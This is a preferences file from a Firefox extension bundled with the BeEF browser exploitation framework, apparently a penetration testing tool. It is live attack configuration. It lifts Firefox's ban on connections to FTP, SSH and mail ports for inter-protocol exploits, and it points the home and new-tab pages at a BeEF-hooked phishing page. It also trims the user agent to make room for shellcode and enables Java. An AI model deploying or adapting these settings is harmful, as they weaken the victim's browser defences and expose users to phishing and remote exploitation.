/*
 * Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
 * Browser Exploitation Framework (BeEF) - http://beefproject.com
 * See the file 'doc/COPYING' for copying permission
 */

// see http://kb.mozillazine.org/Firefox_:_FAQs_:_About:config_Entries
// see http://mike.kaply.com/2012/06/21/best-practices-for-overriding-the-new-tab-page-with-your-extension/
pref("extensions.linktargetfinder.autorun", false);

// PortBanning override
pref("network.security.ports.banned.override", "20,21,22,25,110,143");

// home page is a phishing page create with BeEF Social Engineering extension,
// the BeEF hook is added.
pref("browser.startup.homepage.override", "http://www.binc.com");
pref("browser.newtab.url", "http://www.binc.com");
pref("browser.startup.page.override", "1");

//useful for IPEC exploits, we save almost 90 bytes of space for shellcode
// original: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:15.0) Gecko/20100101 Firefox/15.0.1
// new: Firefox/15.0.1
pref("general.useragent.override", "Firefox/15.0.1");

// enable Java
pref("security.enable_java", true);

